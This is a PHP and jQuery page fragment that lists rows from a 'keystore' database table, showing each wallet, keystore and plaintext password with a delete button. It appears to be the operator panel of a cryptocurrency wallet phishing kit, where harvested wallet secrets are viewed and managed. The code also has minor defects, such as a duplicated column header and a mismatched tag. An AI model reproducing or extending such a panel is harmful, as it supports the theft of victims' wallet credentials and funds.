
                <div id="ks">
                    <table class="table">
                        <thead>
                            <tr>
                                <th scope="col">#</th>
                                <th scope="col">Keystore</th>
                                <th scope="col">Wallet</th>
                                <th scope="col">Password</th>
                                <th scope="col">Date</th>
                                <th scope="col">Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $q = "SELECT * FROM `keystore`";
                            $stm = $con->query($q);
                            $cont = 1;

                            if ($stm->rowCount() > 0) {
                                for ($i = 0; $i < $stm->rowCount(); $i++) {
                                    $data = $stm->fetch();
                                    //    $cont++;


                            ?>

                                    <tr>
                                        <td><?php echo $cont  ?> </th>
                                        <td><?php echo $data->keystone ?></td>
                                        <td><?php echo $data->wallet ?></td>
                                        <td><?php echo $data->password ?></td>

                                        <td><?php echo $data->date ?></td>
                                      <td><button type="button" class="btn btn-outline-danger cli"  id="<?php echo $data->sn ?>"  > del</button></td>
                                    </tr>
                            <?php
                                    $cont++;
                                }
                            }

                            ?>
                        </tbody>
                    </table>
                </div>
                <script>
     $(".cli").click(function (e) { 
                   e.preventDefault();
                   var id=$(this).attr('id');
                //    alert(id)
                     $.ajax({
                         type: "post",
                         url: "handler",
                         data: {
                             id:id,
                             from:"k"
                         },
                         dataType: "text",
                         success: function (response) {
                             if(response==true){
                                 window.location.reload()
                             }else{
                                 alert("no operation perfomed")
                             }
                         }
                     });
                   
               });
</script>